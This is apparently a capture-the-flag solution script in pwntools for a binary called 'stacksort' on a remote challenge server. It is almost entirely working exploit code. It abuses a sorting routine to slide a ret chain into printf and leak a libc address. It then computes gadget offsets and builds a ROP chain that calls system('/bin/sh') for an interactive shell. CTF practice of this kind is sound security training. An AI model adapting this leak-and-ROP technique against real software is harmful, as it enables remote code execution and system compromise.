from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './stacksort'
HOST = 'challs.actf.co'
PORT =  31500

elf = ELF(TARGET)
def start():
	if not args.R:
		return process(TARGET)
		#return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	#script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
context.log_level = 'error'

ret = 0x0040101a
base_offset = 0xf0

BULK = True
bulk = b''
for i in range(base_offset):
    bulk += f'{ret}'.encode().ljust(0xf, b'\x00')
bulk +=  f'{ret}'.encode().ljust(0xf, b'\x00')
bulk +=  f'{elf.sym.printf}'.encode().ljust(0xf, b'\x00')
for i in range(base_offset+2, 0x100):
    bulk += f'{0xffffffffffff}'.encode().ljust(0xf, b'\x00')
assert(len(bulk)==0xf*0x100)
if args.D:
	debug(r, [0x130e])

r.sendafter(b'0: ', bulk)

r.recvuntil(b'255: ')
leak = u64(r.recv(6).ljust(8, b'\x00'))
dbg('leak')
base = leak - 0x21b150
dbg('base')

system = base + 0x50d70

ret = base + 0x00029f3b
rax = base + 0x0003f349#: pop rax; add al, 0x5b; ret;
gad = base + 0x00174aee#: mov rdi, [rsp+0x18]; call rax;

binsh = base + 0x1d8678
rdi = base + 0x001bbea1

base_offset = 0xf0-7
assert(base_offset <=0x100)
bulk = b''
for i in range(base_offset-6):
    bulk += f'{ret}'.encode().ljust(0xf, b'\x00')

bulk += f'{rax}'.encode().ljust(0xf, b'\x00')
bulk += f'{system-0x5b}'.encode().ljust(0xf, b'\x00')
bulk += f'{gad}'.encode().ljust(0xf, b'\x00')
bulk += f'{binsh}'.encode().ljust(0xf, b'\x00')
bulk += f'{binsh}'.encode().ljust(0xf, b'\x00')
bulk += f'{binsh}'.encode().ljust(0xf, b'\x00')
bulk += f'{binsh}'.encode().ljust(0xf, b'\x00')

for i in range(base_offset, 0x100):
    bulk += f'{0xffffffffffff}'.encode().ljust(0xf, b'\x00')
r.sendafter(b'0: ', bulk)
r.recvuntil(b'255: ')

context.log_level = 'debug'

r.interactive()
r.close()
